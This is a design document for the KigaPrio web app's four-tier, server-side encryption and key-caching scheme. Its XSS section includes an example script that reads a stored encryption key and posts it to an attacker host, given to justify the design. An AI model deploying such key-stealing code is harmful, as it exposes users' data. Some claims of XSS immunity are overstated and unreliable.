# KigaPrio System Architecture

## System Overview


### Terms and Used Tools
- **PocketBase**: Self-hosted SQLite database with Auth/Admin interface - [pocketbase.io](https://pocketbase.io)
- **Traefik**: Self-hosted reverse proxy - [traefik.io](https://traefik.io)
- **Redis**: Self-hosted in-memory cache - [redis.io](https://redis.io)
- **DEK**: Data Encryption Key - user-specific key for encrypting stored data
- **Split-Key**: Security technique dividing encryption key between server and client

### Networks

- **Internal Network**: Redis and PocketBase isolated (no internet access)
- **Proxy Network**: Only FastAPI backend exposed via Traefik (ports 80/443)

---

## Encryption Model: Server-Side Always

**CRITICAL: All encryption/decryption happens on the server, regardless of security tier.**

### Why Server-Side Encryption?

1. **Data Validation**: Server validates data BEFORE encryption
   - Business logic enforcement
   - Input sanitization
   - Format validation
   - Prevents database poisoning

2. **Data Integrity**: Server ensures only valid data is stored
   - Cannot bypass validation with client-side encryption
   - Malicious clients cannot inject garbage

3. **Trust Model**: Server trusted to encrypt, not to persistently store DEK
   - Tiers differ in **where DEK is cached**, not **where encryption happens**
   - Server uses DEK transiently during request

### Request Flow (All Tiers)

```
Client → Server: Plaintext data + DEK (or key to retrieve DEK)
                 │
Server:          ├─→ 1. Authenticate
                 ├─→ 2. Validate data
                 ├─→ 3. Encrypt with DEK
                 ├─→ 4. Store in PocketBase
                 └─→ 5. Discard DEK (except Balanced tier caches it)
```

---

## Security Model: Four-Tier Approach

Users choose security level at login, balancing security with convenience:

### 🔴 Maximum Security (True Maximum)
- **DEK Storage**: Never in browser
- **Session Duration**: PocketBase session (30 days)
- **Re-authentication**: Password required for EACH data access/edit
- **How It Works**: 
  - User clicks "View priorities" → Password prompt
  - Password sent to server over HTTPS
  - Server unwraps DEK from password
  - Server decrypts/encrypts data
  - Returns plaintext to user
  - DEK immediately discarded
  - **DEK never touches browser**
- **Server Exposure**: Zero (transient only)
- **XSS Risk**: **None** (no DEK in browser)
- **Use Case**: Maximum paranoia, truly sensitive data

### 🟠 High Security
- **DEK Storage**: Client only (sessionStorage)
- **Session Duration**: Tab lifetime
- **Re-authentication**: Every new tab/session
- **How It Works**: 
  - Client sends DEK with every request
  - Server uses transiently, never caches
  - DEK discarded after request
- **Server Exposure**: Zero
- **XSS Risk**: Medium (DEK in sessionStorage)
- **Use Case**: Shared/public devices

### 🟡 Balanced Security (Default)
- **DEK Caching**: Server-side split-key (Redis + client)
- **Session Duration**: Sliding window
  - Inactivity timeout: 30 minutes
  - Maximum lifetime: 8 hours
- **Re-authentication**: After inactivity or max lifetime
- **How It Works**:
  - Server caches encrypted DEK in Redis
  - Client holds part of decryption key
  - Both parts needed to reconstruct
  - Server extends cache on each request
- **Server Exposure**: Encrypted DEK (split-key protected)
- **XSS Risk**: Low (need server_part too)
- **Use Case**: Personal devices, typical usage

### 🟢 Convenience Mode
- **DEK Caching**: Client only (localStorage, persistent)
- **Session Duration**: Until logout
- **Re-authentication**: Never (until logout/password change)
- **How It Works**:
  - Client sends DEK with every request
  - Server uses transiently, never caches
  - DEK persists across browser sessions
- **Server Exposure**: None
- **XSS Risk**: High (full DEK in localStorage)
- **Use Case**: Personal device, low sensitivity
- **⚠️ Security Notice**: Anyone with device access can read data

### Core Security Principles (All Tiers)

- **Server-Side Encryption**: ALL encryption/decryption on server
- **Data Validation**: Server validates before encrypting
- **At Rest**: All data encrypted in PocketBase
- **In Transit**: HTTPS/TLS encryption
- **Network Isolation**: Database tier has no internet access
- **No Redis Persistence**: Memory-only, cleared on restart
- **Backend**: Only has admin public key (cannot decrypt with it)
- **Admin**: Decrypts locally using private key
- **Authentication**: Long-lived PocketBase sessions (30 days)
- **Encryption Access**: Controlled by user-selected tier

---

## Authentication & Session Flow

### Login and Session Creation (Four-Tier)

```mermaid
%%{init: {'theme':'neutral'}}%%
flowchart TD
    Start["👤 User Login:<br/>Username + Password<br/>+ Security Tier"]
    Verify["🔐 Verify Password<br/>(PocketBase)"]
    CreatePB["📝 Create PB Session<br/>(30-day token)"]
    
    TierCheck{"Security Tier?"}
    
    Maximum["🔴 Maximum:<br/>No DEK storage<br/>Password required<br/>per operation"]
    
    FetchHigh["📥 Fetch User Data:<br/>dek salt<br/>user_wrapped_dek"]
    UnwrapHigh["🔓 Unwrap DEK"]
    High["🟠 High:<br/>Send DEK to client<br/>(sessionStorage)"]
    
    FetchBalanced["📥 Fetch User Data"]
    UnwrapBalanced["🔓 Unwrap DEK"]
    Balanced["🟡 Balanced:<br/>Split keys<br/>Encrypt DEK<br/>Cache in Redis"]
    
    FetchConv["📥 Fetch User Data"]
    UnwrapConv["🔓 Unwrap DEK"]
    Convenience["🟢 Convenience:<br/>Send DEK to client<br/>(localStorage)"]
    
    Done["✅ Logged In"]
    
    Start --> Verify
    Verify -->|"Valid"| CreatePB
    Verify -->|"Invalid"| Fail["❌ Login Failed"]
    CreatePB --> TierCheck
    
    TierCheck -->|"Maximum"| Maximum
    TierCheck -->|"High"| FetchHigh
    TierCheck -->|"Balanced"| FetchBalanced
    TierCheck -->|"Convenience"| FetchConv
    
    FetchHigh --> UnwrapHigh --> High
    FetchBalanced --> UnwrapBalanced --> Balanced
    FetchConv --> UnwrapConv --> Convenience
    
    Maximum --> Done
    High --> Done
    Balanced --> Done
    Convenience --> Done
    
    classDef action fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px
    classDef backend fill:#c8e6c9,stroke:#2e7d32,stroke-width:2px
    classDef database fill:#ffcdd2,stroke:#c62828,stroke-width:2px
    classDef security fill:#ffecb3,stroke:#f57c00,stroke-width:2px

    class Start action
    class Verify backend
    class CreatePB backend
    class TierCheck security
    class Maximum security
    class High security
    class Balanced security
    class Convenience security
    class Done action
    class Fail action
```



### Balanced Security: Sliding Window

**Session Extension Behavior:**
- Active user: Works for 8 hours without interruption
- Inactive 30+ minutes: Must re-enter password
- After 8 hours: Must re-login regardless of activity

**Mechanism:**
- Each request checks session age against max lifetime (8h)
- If within limit, reset inactivity timer (30m)
- If expired or beyond max, require re-authentication

### Session Refresh of Auth
- Using PocketBase refresh mechanisms

---

## Encryption Flows

### Registration Flow

```mermaid
%%{init: {'theme':'neutral'}}%%
flowchart TD
    Start["👤 User Registers:<br/>Password<br/>Child Names<br/>Security Tier"] 
    GenDEK["🔑 Generate DEK<br/>(256-bit AES)"]
    WrapUser["🔐 Wrap for User:<br/>Encrypt with<br/>password-derived key"]
    WrapAdmin["🔐 Wrap for Admin:<br/>Encrypt with<br/>admin public key"]
    Validate["✓ Validate Data:<br/>Business rules<br/>Format checks"]
    Encrypt["🔒 Encrypt Data:<br/>(Server-side)"]
    Store["💾 Store:<br/>Encrypted fields<br/>Wrapped DEKs<br/>Security tier"]
    Session["🎫 Create Session<br/>(tier-specific)"]
    
    Start --> GenDEK
    GenDEK --> WrapUser
    GenDEK --> WrapAdmin
    GenDEK --> Validate
    Validate --> Encrypt
    WrapUser --> Store
    WrapAdmin --> Store
    Encrypt --> Store
    Store --> Session
    Session --> Done["✅ Registered"]
    
    classDef action fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px
    classDef backend fill:#c8e6c9,stroke:#2e7d32,stroke-width:2px
    classDef database fill:#ffcdd2,stroke:#c62828,stroke-width:2px
    classDef validate fill:#fff9c4,stroke:#f57f17,stroke-width:2px

    class Start action
    class GenDEK backend
    class WrapUser backend
    class WrapAdmin backend
    class Validate validate
    class Encrypt backend
    class Store database
    class Session backend
    class Done backend
```



---

### Data Access Flows

**Key Point**: Client sends **plaintext data** + DEK/keys. Server validates then encrypts.

#### 🔴 Maximum Security

```mermaid
%%{init: {'theme':'neutral'}}%%
flowchart TD
    Request["👤 User Action:<br/>View/Edit Data"]
    Auth["🔐 Verify PB Session"]
    Prompt["🔑 Password Prompt:<br/>Enter password"]
    SendPW["📤 Send Password<br/>(HTTPS only)"]
    FetchWrapped["📥 Fetch:<br/>dek salt<br/>user_wrapped_dek"]
    UnwrapDEK["🔓 Unwrap DEK:<br/>From password"]
    ProcessData["⚙️ Process Request:<br/>Validate → Encrypt/Decrypt"]
    Cleanup["🧹 Discard:<br/>Password & DEK<br/>immediately"]
    Return["📤 Return Result"]
    Done["✅ Complete"]
    
    Request --> Auth
    Auth -->|"Valid"| Prompt
    Auth -->|"Invalid"| Fail["❌ Re-login"]
    Prompt --> SendPW
    SendPW --> FetchWrapped
    FetchWrapped --> UnwrapDEK
    UnwrapDEK --> ProcessData
    ProcessData --> Cleanup
    Cleanup --> Return
    Return --> Done
    
    classDef action fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px
    classDef backend fill:#c8e6c9,stroke:#2e7d32,stroke-width:2px
    classDef database fill:#ffcdd2,stroke:#c62828,stroke-width:2px
    
    class Request action
    class Prompt action
    class ProcessData backend
    class Cleanup backend
    class Done action
```



**Key Behavior:**
- Every view/edit operation requires password
- DEK never stored in browser
- Password sent securely over HTTPS only
- Server unwraps DEK on each request
- Immediate cleanup after processing

#### 🟠 High Security

```mermaid
%%{init: {'theme':'neutral'}}%%
flowchart TD
    Request["👤 Submit:<br/>Plaintext data<br/>+ DEK"]
    Auth["🔐 Authenticate"]
    GetDEK["🔑 Get DEK<br/>from header"]
    Validate["✓ Validate Data"]
    Encrypt["🔒 Encrypt<br/>(Server-side)"]
    Store["💾 Store"]
    Cleanup["🧹 Discard DEK"]
    Done["✅ Submitted"]
    
    Request --> Auth
    Auth -->|"Valid"| GetDEK
    Auth -->|"Invalid"| Fail["❌ Auth Failed"]
    GetDEK --> Validate
    Validate -->|"Valid"| Encrypt
    Validate -->|"Invalid"| Reject["❌ Invalid Data"]
    Encrypt --> Store
    Store --> Cleanup
    Cleanup --> Done
    
    classDef action fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px
    classDef backend fill:#c8e6c9,stroke:#2e7d32,stroke-width:2px
    classDef database fill:#ffcdd2,stroke:#c62828,stroke-width:2px
    classDef validate fill:#fff9c4,stroke:#f57f17,stroke-width:2px
    
    class Request action
    class Validate validate
    class Encrypt backend
    class Cleanup backend
    class Store database
    class Done action
```



#### 🟡 Balanced Security

```mermaid
%%{init: {'theme':'neutral'}}%%
flowchart TD
    Request["👤 Submit:<br/>Plaintext data<br/>+ client_part"]
    Auth["🔐 Authenticate"]
    CheckCache["📥 Check Cache"]
    
    CacheHit{"Valid?"}
    
    Extend["⏰ Extend:<br/>Check max (8h)<br/>Reset timer (30m)"]
    ReAuth["🔐 Re-auth:<br/>Prompt password<br/>Unwrap DEK"]
    
    GetDEK["🔓 Reconstruct DEK:<br/>server_part<br/>+ client_part"]
    Validate["✓ Validate"]
    Encrypt["🔒 Encrypt"]
    Store["💾 Store"]
    Done["✅ Submitted"]
    
    Request --> Auth
    Auth --> CheckCache
    CheckCache --> CacheHit
    
    CacheHit -->|"Yes"| Extend
    CacheHit -->|"No"| ReAuth
    
    Extend --> GetDEK
    ReAuth --> GetDEK
    GetDEK --> Validate
    Validate --> Encrypt
    Encrypt --> Store
    Store --> Done
    
    classDef action fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px
    classDef backend fill:#c8e6c9,stroke:#2e7d32,stroke-width:2px
    classDef database fill:#ffcdd2,stroke:#c62828,stroke-width:2px
    classDef validate fill:#fff9c4,stroke:#f57f17,stroke-width:2px
    
    class Request action
    class Validate validate
    class Encrypt backend
    class Done action
    class Store database
    class ReAuth action
```



#### 🟢 Convenience Mode

```mermaid
%%{init: {'theme':'neutral'}}%%
flowchart TD
    Request["👤 Submit:<br/>Plaintext data<br/>+ DEK"]
    Auth["🔐 Authenticate"]
    GetDEK["🔑 Get DEK"]
    Validate["✓ Validate"]
    Encrypt["🔒 Encrypt"]
    Store["💾 Store"]
    Cleanup["🧹 Discard DEK"]
    Done["✅ Submitted"]
    
    Request --> Auth
    Auth -->|"Valid"| GetDEK
    Auth -->|"Expired"| Fail["❌ Re-login"]
    GetDEK --> Validate
    Validate --> Encrypt
    Encrypt --> Store
    Store --> Cleanup
    Cleanup --> Done
    
    classDef action fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px
    classDef backend fill:#c8e6c9,stroke:#2e7d32,stroke-width:2px
    classDef validate fill:#fff9c4,stroke:#f57f17,stroke-width:2px
    
    class Request action
    class Validate validate
    class Encrypt backend
    class Cleanup backend
    class Done action
```



---

### Password Change

All security tiers must re-authenticate:

```mermaid
%%{init: {'theme':'neutral'}}%%
flowchart TD
    Start["👤 Change Password"]
    Verify["🔐 Verify Old"]
    Fetch["📥 Fetch Wrappers"]
    Unwrap["🔓 Unwrap DEK"]
    Rewrap["🔐 Rewrap with New"]
    Update["💾 Update:<br/>New password<br/>New salt<br/>New wrapper<br/>Same DEK"]
    Invalidate["🗑️ Invalidate<br/>All Sessions"]
    NewSession["🎫 New Session"]
    Done["✅ Changed<br/>Others Logged Out"]
    
    Start --> Verify
    Verify --> Fetch
    Fetch --> Unwrap
    Unwrap --> Rewrap
    Rewrap --> Update
    Update --> Invalidate
    Invalidate --> NewSession
    NewSession --> Done
    
    classDef action fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px
    classDef backend fill:#c8e6c9,stroke:#2e7d32,stroke-width:2px
    classDef security fill:#ffccbc,stroke:#e64a19,stroke-width:2px
    
    class Start action
    class Verify backend
    class Fetch backend
    class Unwrap backend
    class Rewrap backend
    class Update backend
    class Invalidate security
    class NewSession backend
    class Done backend
```



---

## Data Storage by Security Tier

### PocketBase (All Tiers)

| Field | Type | Description |
|-------|------|-------------|
| `username` | plaintext | User login name |
| `password` | bcrypt | Hashed password |
| `salt` | base64 | DEK derivation salt |
| `user_wrapped_dek` | base64 | DEK encrypted with password |
| `admin_wrapped_dek` | base64 | DEK encrypted with admin public key |
| `encrypted_fields` | base64 | Encrypted data (server-encrypted) |
| `security_tier` | string | "maximum", "high", "balanced", or "convenience" |

### Redis (Balanced Tier Only)

| Key | Value | TTL |
|-----|-------|-----|
| `dek_cache:{user}:{token}` | `{server_part, encrypted_dek, created_at}` | Sliding: 30m idle, 8h max |

**Config**: `--save "" --appendonly no` (memory-only, no persistence)

### Client Storage

| Tier | Storage | Key | Value | Lifetime |
|------|---------|-----|-------|----------|
| 🔴 Maximum | None | - | **No DEK stored** | - |
| 🟠 High | sessionStorage | `dek` | Base64 DEK | Tab only |
| 🟡 Balanced | sessionStorage | `client_part` | Base64 (32b) | Tab only |
| 🟢 Convenience | localStorage | `dek` | Base64 DEK | Until logout |
| All | Cookie | `pb_auth` | PB token | 30 days |

**Client sends with requests:**
- Maximum: Password when prompted (HTTPS only)
- High/Convenience: `X-DEK: {dek}` header + plaintext data
- Balanced: `X-Client-Part: {client_part}` header + plaintext data

---

## Security Comparison Matrix

### Tier Comparison

| Feature | Maximum 🔴 | High 🟠 | Balanced 🟡 | Convenience 🟢 |
|---------|-----------|---------|-------------|---------------|
| **Encryption** | Server-side | Server-side | Server-side | Server-side |
| **Validation** | Server-side | Server-side | Server-side | Server-side |
| **Duration** | PB session | Tab only | 30m idle/8h max | Until logout |
| **DEK on Server** | Never cached | Never cached | Encrypted (split) | Never cached |
| **DEK on Client** | **Never stored** | sessionStorage | Part only | localStorage |
| **Server Breach** | Must intercept | Must intercept | Need client_part | Must intercept |
| **XSS Risk** | **None** | Medium | Low | High |
| **Device Theft** | Low | Low | Low | **HIGH** |
| **DB Poisoning** | ✅ Prevented | ✅ Prevented | ✅ Prevented | ✅ Prevented |
| **UX Active** | Fair (prompts) | Good | Excellent | Excellent |
| **UX Return** | Password prompt | Re-login tab | 30m password | No password |

### Attack Resistance

| Attack | Maximum 🔴 | High 🟠 | Balanced 🟡 | Convenience 🟢 |
|--------|-----------|---------|-------------|---------------|
| DB breach | ✅ Encrypted | ✅ Encrypted | ✅ Encrypted | ✅ Encrypted |
| Server (passive) | ✅ No DEK | ✅ No DEK | 🟡 Need client | ✅ No DEK |
| Server (active) | ⚠️ Intercept PW | ⚠️ Intercept DEK | ⚠️ Intercept split | ⚠️ Intercept DEK |
| Network sniff | 🟡 HTTPS (PW) | 🟡 HTTPS (DEK) | ✅ Split-key | 🟡 HTTPS (DEK) |
| **XSS** | **✅ No DEK** | ⚠️ Steal DEK | 🟡 Need server | ⚠️ Steal DEK |
| **Device theft** | ✅ No storage | ✅ Tab-only | ✅ Tab-only | **❌ Full access** |
| **DB poison** | ✅ Validated | ✅ Validated | ✅ Validated | ✅ Validated |
| Idle session | ✅ PB timeout | ✅ Tab closes | ✅ 30m timeout | ⚠️ Persists |

---

## Security Guarantees

### All Tiers
✅ **Server-side encryption** - prevents database poisoning  
✅ **Server-side validation** - enforces business rules  
✅ **Admin key never on server** - offline decryption only  
✅ **Database encrypted at rest** - all sensitive data  
✅ **Password change efficient** - no data re-encryption  
✅ **Network isolation** - DB tier has no internet  
✅ **User choice** - security vs convenience  
✅ **Auth separation** - long sessions, controlled encryption  

### Tier-Specific

**🔴 Maximum Security**
- **Zero DEK storage anywhere in browser**
- Password required for each operation
- DEK only in server memory during request
- **XSS cannot steal what doesn't exist**
- True maximum security

**🟠 High Security**
- Zero server-side DEK caching
- Tab-level isolation
- DEK in memory during request only
- Vulnerable to XSS (DEK in sessionStorage)
- Good for shared devices

**🟡 Balanced Security**
- Split-key protection
- Memory-only Redis
- Sliding window (no forced logout)
- 30m inactivity / 8h maximum limits
- Low XSS risk (need both parts)

**🟢 Convenience Mode**
- Honest security model
- Explicit user consent
- No server-side DEK storage
- Device access = data access (user aware)
- High XSS risk (full DEK accessible)

---

## User Communication

### Login Screen

```
Choose Your Security Level:

🔴 Maximum Security
   Enter password each time you view or edit data
   ✓ Best for: Truly sensitive data, maximum paranoia
   ✓ Your encryption key is NEVER stored anywhere
   ✓ Immune to XSS attacks
   ✓ Most secure option available
   
🟠 High Security
   Re-enter password each browser session
   ✓ Best for: Shared or public computers
   ✓ Your encryption key stored only while tab is open
   ⚠️ Vulnerable to XSS attacks while tab is open
   
🟡 Balanced Security (Recommended)
   Stay logged in during active use
   ✓ Best for: Personal devices, regular use
   ✓ Re-enter password after 30 minutes of inactivity
   ✓ Maximum 8-hour session
   ✓ Good protection against XSS attacks
   
🟢 Remember Me (Convenience)
   Stay logged in until you log out
   ⚠️ Best for: Your personal device only
   ⚠️ Anyone with access to this device can read your data
   ⚠️ Vulnerable to XSS attacks
   ⚠️ Only use if you trust everyone who uses this device
```

### Security Warnings

**Maximum Security Info:**
```
🔴 MAXIMUM SECURITY MODE

You've chosen the most secure option. You will be prompted to 
enter your password each time you:
• View your priorities
• Edit your priorities
• Access any encrypted data

This ensures your encryption key is never stored on your device
or in your browser, making it immune to XSS and device theft.

[I Understand]
```

**Convenience Mode Warning:**
```
⚠️ SECURITY NOTICE

You've chosen "Remember Me" mode. This means:

• Your encryption key is stored on this device
• Anyone who can access this browser can read your data
• This includes family members, coworkers, or anyone else
• Your data is vulnerable to XSS attacks

Only enable this on your private, personal device.

[ ] I understand and accept the risks
[Continue]  [Choose Different Mode]
```

---

## Why Maximum Security Works

### The XSS Problem

**XSS (Cross-Site Scripting)** allows attackers to inject malicious JavaScript into a website. If successful:

```javascript
// Attacker's injected code
const stolenDEK = sessionStorage.getItem('dek');
fetch('https://attacker.com/steal', { 
  method: 'POST', 
  body: stolenDEK 
});
// DEK stolen, all data compromised
```

### Maximum Security Solution

**In Maximum tier, there is no DEK to steal:**

```javascript
// Attacker's injected code
const stolenDEK = sessionStorage.getItem('dek');
// Returns null - nothing stored!

const stolenDEK2 = localStorage.getItem('dek');
// Also returns null

// Attacker gets nothing
```

**User workflow:**
1. User authenticated via PocketBase (long session)
2. User clicks "View April priorities"
3. Modal appears: "Enter password to view encrypted data"
4. User enters password
5. Password sent to server (HTTPS only, never stored)
6. Server unwraps DEK with password
7. Server decrypts data
8. Server returns plaintext data
9. **DEK and password immediately discarded**
10. User sees their data
11. Process repeats for each operation

**Why this is secure:**
- DEK never in browser memory (can't be stolen by XSS)
- Password sent only when needed (very short exposure window)
- Even if attacker intercepts password during single request, they get access to only that one operation
- Device theft: No persistent credentials

---

## Why Server-Side Encryption Matters

### Database Integrity Protection

**Problem with client-side encryption:**
- Malicious client can encrypt garbage data
- Server cannot validate encrypted blob
- Database gets poisoned with invalid data

**Solution with server-side encryption:**
- Server receives plaintext data
- Validates BEFORE encryption (business rules, format, sanitization)
- Only valid data is encrypted and stored
- Malicious data rejected before reaching database

### Trust Boundary

```
✅ Correct Architecture:
Client (untrusted) → Plaintext → Server (trusted) → Validate → Encrypt → Store

❌ Wrong Architecture:
Client (untrusted) → Encrypt → Server (blind) → Store garbage
```

---

## Architecture Benefits

1. **True Maximum Security**: Actually immune to XSS attacks
2. **Data Integrity**: Server validates all data before storage
3. **Flexible Security**: Users choose based on their threat model
4. **No Forced Logouts**: Balanced tier allows continuous work
5. **Defense in Depth**: Multiple layers (encryption, network isolation, validation)
6. **Admin Oversight**: Can decrypt without exposing private key to server
7. **Password Change Efficient**: No data re-encryption needed
8. **Honest Tradeoffs**: Clear about security implications of each tier
